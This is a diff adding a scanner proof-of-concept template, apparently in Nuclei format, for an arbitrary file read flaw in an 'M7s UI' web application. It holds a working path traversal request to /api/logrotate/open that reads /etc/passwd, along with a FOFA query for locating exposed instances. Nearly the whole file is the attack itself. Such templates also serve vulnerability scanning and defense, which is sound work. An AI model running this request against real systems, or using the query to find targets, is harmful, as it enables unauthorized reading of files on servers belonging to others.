@@ -1,0 +1,31 @@
+id: poc-rr6y6rwpyg7usmam
+info:
+  name: M7s UI open存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rr6y6rwpyg7usmam'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rr6y6rwpyg7usmam
+    fofa: body="static/js/chunk-libs.9540f991.js"
+http:
+- raw:
+  - 'GET /api/logrotate/open?file=../../../../../../../../../../../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    Accept: application/json, text/plain, */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
